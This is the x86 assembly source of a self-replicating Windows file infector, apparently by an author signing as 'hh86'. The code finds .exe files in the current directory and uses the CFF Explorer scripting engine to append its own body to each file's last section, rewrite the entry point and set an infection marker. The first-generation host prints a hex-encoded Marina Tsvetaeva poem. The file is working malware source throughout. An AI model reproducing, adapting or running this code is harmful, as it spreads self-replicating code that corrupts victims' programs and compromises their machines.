.386
.model  flat, stdcall
include CFFE.inc
.code
assume fs:nothing

link_text       proc     near
        call    text_end

text_begin      label    near
        db      49h, 20h, 63h, 68h
        db      72h, 69h, 73h, 74h
        db      65h, 6eh, 20h, 79h
        db      6fh, 75h, 72h, 20h
        db      66h, 72h, 69h, 67h
        db      68h, 74h, 65h, 6eh
        db      69h, 6eh, 67h, 20h
        db      66h, 6ch, 69h, 67h
        db      68h, 74h, 3ah, 0ah
        db      0dh, 59h, 6fh, 75h
        db      6eh, 67h, 20h, 65h
        db      61h, 67h, 6ch, 65h
        db      2ch, 20h, 72h, 69h
        db      73h, 65h, 20h, 69h
        db      6eh, 20h, 74h, 68h
        db      65h, 20h, 61h, 69h
        db      72h, 21h, 0ah, 0dh
        db      59h, 6fh, 75h, 20h
        db      73h, 74h, 61h, 72h
        db      65h, 64h, 20h, 61h
        db      74h, 20h, 74h, 68h
        db      65h, 20h, 73h, 75h
        db      6eh, 21h, 20h, 2dh
        db      20h, 6dh, 79h, 20h
        db      6ch, 69h, 67h, 68h
        db      74h, 0ah, 0dh, 41h
        db      6eh, 64h, 20h, 64h
        db      65h, 6ch, 69h, 63h
        db      61h, 74h, 65h, 20h
        db      67h, 61h, 7ah, 65h
        db      20h, 63h, 61h, 6eh
        db      27h, 74h, 20h, 63h
        db      6fh, 6dh, 70h, 61h
        db      72h, 65h, 2eh, 0ah
        db      0dh, 0ah, 0dh, 49h
        db      20h, 73h, 74h, 6fh
        db      6fh, 64h, 2ch, 20h
        db      6dh, 6fh, 72h, 65h
        db      20h, 74h, 65h, 6eh
        db      64h, 65h, 72h, 20h
        db      74h, 68h, 61h, 6eh
        db      20h, 74h, 68h, 6fh
        db      73h, 65h, 0ah, 0dh
        db      57h, 68h, 6fh, 27h
        db      76h, 65h, 20h, 77h
        db      69h, 74h, 6eh, 65h
        db      73h, 73h, 65h, 64h
        db      20h, 79h, 6fh, 75h
        db      20h, 64h, 69h, 73h
        db      61h, 70h, 70h, 65h
        db      61h, 72h, 2eh, 2eh
        db      2eh, 0ah, 0dh, 49h
        db      27h, 6dh, 20h, 6bh
        db      69h, 73h, 73h, 69h
        db      6eh, 67h, 20h, 79h
        db      6fh, 75h, 20h, 6eh
        db      6fh, 77h, 20h, 2dh
        db      20h, 61h, 63h, 72h
        db      6fh, 73h, 73h, 0ah
        db      0dh, 54h, 68h, 65h
        db      20h, 67h, 61h, 70h
        db      20h, 6fh, 66h, 20h
        db      61h, 20h, 74h, 68h
        db      6fh, 75h, 73h, 61h
        db      6eh, 64h, 20h, 79h
        db      65h, 61h, 72h, 73h
        db      2eh, 0ah, 0dh
        db      "Marina Tsvetaeva (1916)"

text_end        label    near
        pop     ecx
        xor     ebx, ebx
        push    ebx
        push    500h
        push    ebx
        push    ebx
        push    offset text_end - offset text_begin
        push    ecx
        push    -0bh                         ;STD_OUTPUT_HANDLE
        call    WriteFile
        call    Sleep
        call    ExitProcess
link_text       endp

cffe_code       label    near
        push    offset link_text
        jmp     cffe_offpush

cffe_begin      label    near

;-------------------------------------------------------------------------------
;here begins code in infected files
;-------------------------------------------------------------------------------

        push    dword ptr [ebx + PROCESS_ENVIRONMENT_BLOCK.dwImageBaseAddress]
        add     dword ptr [esp], "hh86"

cffe_offpush    label    near
        pushad
        call    cffe_mainseh
        pop     eax
        pop     eax
        pop     esp
        xor     eax, eax
        pop     dword ptr fs:[eax]
        pop     eax
        popad
        ret

cffe_mainseh    label    near
        xor     edx, edx
        push    dword ptr fs:[edx]
        mov     dword ptr fs:[edx], esp
        mov     eax, dword ptr [ebx + PROCESS_ENVIRONMENT_BLOCK.lpLoaderData]
        mov     esi, dword ptr [eax + _PEB_LDR_DATA.dwInLoadOrderModuleList.FLink]
        lods    dword ptr [esi]
        xchg    esi, eax
        lods    dword ptr [esi]
        mov     ebp, dword ptr [eax + 18h]
        call    walk_dll
        dd      0b09315f4h                   ;CloseHandle
        dd      0a851d916h                   ;CreateProcessA
        dd      0d82bf69ah                   ;FindClose
        dd      0c9ebd5ceh                   ;FindFirstFileA
        dd      075272948h                   ;FindNextFileA
        dd      07fbc7431h                   ;GlobalAlloc
        dd      0636b1e9dh                   ;GlobalFree
        dd      03fc1bd8dh                   ;LoadLibraryA
        dd      0839a7905h                   ;SetErrorMode

ifdef WaitObject
        dd      0e058bb45h                   ;WaitForSingleObject
endif
        db      0

;-------------------------------------------------------------------------------
;advapi32 API data
;-------------------------------------------------------------------------------

        call    load_advapi32

advapi32_name   label    near
        db      "advapi32", 0

lpsubkey        label    near
        db      "CFFExplorer.Script\shell\open\command", 0

advapi32_crc    label    near
        dd      0a9290135h                   ;RegCloseKey
        dd      0c13a7ad3h                   ;RegOpenKeyExA
        dd      0b039adfeh                   ;RegQueryValueExA
        db      0

setup_cffex     label    near

;-------------------------------------------------------------------------------
;query command-line for .cff file
;-------------------------------------------------------------------------------

        enter   sizeof WIN32_FIND_DATA + sizeof IMAGE_DOS_HEADER.e_magic, 0
        lea     eax, dword ptr [esi - (offset setup_cffex - offset lpsubkey)]
        xor     ebx, ebx
        push    ebx
        push    esp
        push    KEY_ALL_ACCESS
        push    ebx
        push    eax
        inc     ecx
        ror     ecx, 1
        push    ecx
        call    dword ptr [ebp + ADVAPI32.aRegOpenKeyExA + 4]
        test    eax, eax
        jnz     cffe_glexit
        mov     ah, 80h
        push    eax
        push    40h
        call    dword ptr [ebp + sizeof ADVAPI32 + KERNEL32.kGlobalAlloc + 4]
        xchg    edi, eax
        mov     esi, esp
        push    SEM_NOOPENFILEERRORBOX or SEM_NOGPFAULTERRORBOX or SEM_NOALIGNMENTFAULTEXCEPT or SEM_FAILCRITICALERRORS
        call    dword ptr [ebp + sizeof ADVAPI32 + KERNEL32.kSetErrorMode + 4]
        pop     edx
        push    eax                          ;preserve error mode
        pushad
        call    cffe_glseh

delta_glseh     label    near
        pop     eax
        pop     eax
        pop     esp
        xor     eax, eax
        pop     dword ptr fs:[eax]
        pop     eax
        popad
        push    edi
        push    edx
        call    dword ptr [ebp + ADVAPI32.aRegCloseKey + 4]
        call    dword ptr [ebp + sizeof ADVAPI32 + KERNEL32.kGlobalFree + 4]
        call    dword ptr [ebp + sizeof ADVAPI32 + KERNEL32.kSetErrorMode]

cffe_glexit     label    near
        int     3

cffe_fmask      label    near
        db      "*.exe", 0

cffs_body1      label    near
        db      '-CFFSCRIPT=f=OpenFile("'   ;so I'm asking you, help me carry

cffe_glseh      label    near
        pop     ecx
        push    ecx
        push    dword ptr fs:[ebx]
        mov     dword ptr fs:[ebx], esp
        lea     ecx, dword ptr [ecx + (offset cffe_fmask - offset delta_glseh)]
        push    esi
        push    ecx
        push    ecx
        push    7fh
        push    esp
        push    edi
        push    ebx
        push    ebx
        push    esp
        push    edx
        call    dword ptr [ebp + ADVAPI32.aRegQueryKeyExA + 4]
        pop     edx

;-------------------------------------------------------------------------------
;initialise main argument, and beginning of script
;-------------------------------------------------------------------------------

        xchg    esi, eax
        pop     esi
        push    edi
        lea     edi, dword ptr [edi + edx - ((offset cffs_body1 - offset cffe_fmask) - 3)]
        add     esi, 6                       ;offset cffs_body1 - offset cffe_fmask
        push    low (offset cffe_glseh - offset cffs_body1)
        pop     ecx
        rep     movs byte ptr [edi], byte ptr [esi]
        mov     dword ptr [esi + (offset cffs_gloff - offset cffe_glseh) - 4], edi
        pop     edi
        xchg    esi, eax
        call    dword ptr [ebp + sizeof ADVAPI32 + KERNEL32.kFindFirstFileA + 4]

find_loop       label    near
        pushad
        push    edi

;-------------------------------------------------------------------------------
;initialise full command-line:
;-------------------------------------------------------------------------------

        mov     edi, "hh86"

;-------------------------------------------------------------------------------
;initialise source command-line
;-------------------------------------------------------------------------------

cffs_gloff      label    near
        lea     esi, dword ptr [esi + WIN32_FIND_DATA.cFileName]
        call    copy_fname

cffs_body2      label    near
        db      '");if ReadWord(f,0)==23117 and ReadWord(f,2)!=1986 then p=GetOffset(f,1);d=4096;c=ReadWord(f,p+22);if ReadDword(f,p)==17744 and ReadWord(f,p+4)==332 and IsPE64(f)==false and c&2==2 and c&d!=d and'
        db      " ReadWord(f,p+92)==2 and ReadWord(f,p+20)==224 then s=GetOffset(f,5)+(ReadWord(f,p+6)-1)*40;if GetFileSize(f)==ReadDword(f,s+20)+ReadDword(f,s+16)then h=AddDataToLastSection(f,{"

cffs_body3      label    near
        db      '});if h then WriteWord(f,2,1986);WriteQword(f,p+200,0);WriteQword(f,p+160,0);WriteWord(f,p+94,0);WriteDword(f,h+6,ReadDword(f,p+40));WriteDword(f,p+40,OffsetToRva(f,h));'
        db      'WriteDword(f,s+36,ReadDword(f,s+36)|2<<28);SaveFile(f);end;end;end;CloseHandle(f);end', 0

copy_fname      label    near

;-------------------------------------------------------------------------------
;copy file name
;-------------------------------------------------------------------------------

        movs    byte ptr [edi], byte ptr [esi]
        cmp     byte ptr [esi], bl
        jne     copy_fname
        pop     esi

;-------------------------------------------------------------------------------
;copy script until array
;-------------------------------------------------------------------------------

        mov     ecx, offset cffs_body3 - offset cffs_body2
        rep     movs byte ptr [edi], byte ptr [esi]

;-------------------------------------------------------------------------------
;generate C array
;-------------------------------------------------------------------------------

        push    esi
        sub     esi, offset cffs_body3 - offset cffe_begin
        mov     cx, offset cffe_end - offset cffe_begin

encode_byte     label    near
        mov     ax, "x0"
        stos    word ptr [edi]
        lods    byte ptr [esi]
        push    eax
        and     al, 0f0h
        shr     al, 4
        cmp     al, 0ah
        sbb     al, 69h
        das
        stos    byte ptr [edi]
        pop     eax
        and     al, 0fh
        cmp     al, 0ah
        sbb     al, 69h
        das
        stos    byte ptr [edi]
        mov     al, ","
        stos    byte ptr [edi]
        loop    encode_byte
        dec     edi

;-------------------------------------------------------------------------------
;copy final piece of script
;-------------------------------------------------------------------------------

        pop     esi
        mov     cl, offset copy_fname - offset cffs_body3
        rep     movs byte ptr [edi], byte ptr [esi]
        mov     dword ptr [edi], ecx
        pop     edi
        
;-------------------------------------------------------------------------------
;execute CFF Explorer
;if interpreter fails and display an error, we must not use TerminateProcess API
;at that point, the engine has already created a temp file containing our script
;and it won't be deleted, filling the disk
;-------------------------------------------------------------------------------

        xchg    ebp, eax
        enter   sizeof STARTUPINFO, 0        ;PROCESS_INFORMATION overwrites this
        mov     esi, esp
        push    ebp
        xchg    ebp, eax
        push    esi
        push    esi
        push    ebx
        push    ebx
        push    ebx
        push    ebx
        push    ebx
        push    ebx
        push    edi
        mov     edi, esi
        mov     cl, sizeof STARTUPINFO
        xor     al, al
        rep     stos byte ptr [edi]
        push    ebx
        call    dword ptr [ebp + sizeof ADVAPI32 + KERNEL32.kCreateProcessA + 4]
        xchg    eax, ecx
        jecxz   pcssfailure

ifdef WaitObject
        mov     ecx, dword ptr [esi + PROCESS_INFORMATION.hProcess]
        push    dword ptr [esi + PROCESS_INFORMATION.hThread]
        push    ecx
        push    TIMEOUT
        push    ecx
        call    dword ptr [ebp + sizeof ADVAPI32 + KERNEL32.kWaitForSingleObject + 4]
else
        push    dword ptr [esi + PROCESS_INFORMATION.hThread]
        push    dword ptr [esi + PROCESS_INFORMATION.hProcess]
endif

        call    dword ptr [ebp + sizeof ADVAPI32 + KERNEL32.kCloseHandle + 4]
        call    dword ptr [ebp + sizeof ADVAPI32 + KERNEL32.kCloseHandle + 4]

pcssfailure     label    near
        pop     ebp
        leave
        popad
        push    eax
        push    esi
        push    eax
        call    dword ptr [ebp + sizeof ADVAPI32 + KERNEL32.kFindNextFileA + 4]
        test    eax, eax
        pop     eax
        jnz     find_loop
        push    eax
        call    dword ptr [ebp + sizeof ADVAPI32 + KERNEL32.kFindClose + 4]
        int     3

load_advapi32   label    near

;-------------------------------------------------------------------------------
;get advapi32 APIs
;-------------------------------------------------------------------------------

        pop     esi
        push    esi
        call    dword ptr [esp + KERNEL32.kLoadLibraryA + sizeof KERNEL32.kWaitForSingleObject]
        xchg    ebp, eax
        add     esi, "h"
        org     $-1
        db      offset advapi32_crc - offset advapi32_name
        push    esi

walk_dll        label    near

;-------------------------------------------------------------------------------
;DLL walker
;-------------------------------------------------------------------------------

        pop     esi
        mov     ebx, ebp
        mov     eax, dword ptr [ebp + IMAGE_DOS_HEADER_E_LFANEW]
        add     ebx, dword ptr [ebp + eax + IMAGE_DOS_HEADER_E_LFANEW shl 1]
        cdq

walk_names      label    near
        mov     eax, ebp
        mov     edi, ebp
        inc     edx
        add     eax, dword ptr [ebx + IMAGE_EXPORT_DIRECTORY_ADDRESS_OF_NAMES]
        add     edi, dword ptr [eax + edx * 4]
        or      eax, -1

crc32_l1        label    near
        xor     al, byte ptr [edi]
        push    8
        pop     ecx

crc32_l2        label    near
        shr     eax, 1
        jnc     crc32_l3
        xor     eax, 0edb88320h

crc32_l3        label    near
        loop    crc32_l2
        inc     edi
        cmp     byte ptr [edi], cl
        jne     crc32_l1
        not     eax
        cmp     dword ptr [esi], eax
        jne     walk_names
        mov     edi, ebp
        mov     eax, ebp
        add     edi, dword ptr [ebx + IMAGE_EXPORT_DIRECTORY_ADDRESS_OF_NAME_ORDINALS]
        movzx   edi, word ptr [edi + edx * 2]
        add     eax, dword ptr [ebx + IMAGE_EXPORT_DIRECTORY_ADDRESS_OF_FUNCTIONS]
        mov     eax, dword ptr [eax + edi * 4]
        add     eax, ebp
        push    eax
        lods    dword ptr [esi]
        sub     cl, byte ptr [esi]
        jnz     walk_names
        inc     esi
        jmp     esi

cffe_end        label    near

end     cffe_code